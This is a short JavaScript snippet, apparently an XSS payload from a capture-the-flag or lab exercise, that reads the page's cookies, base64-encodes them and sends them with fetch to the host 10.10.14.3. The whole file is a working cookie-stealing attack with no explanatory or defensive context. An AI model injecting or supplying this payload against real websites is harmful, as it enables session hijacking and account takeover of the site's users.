async function getCookie(){
    var cookie = document.cookie;
    cookie = btoa(cookie);

    await fetch("http://10.10.14.3/?b64=" + cookie);


}
getCookie();
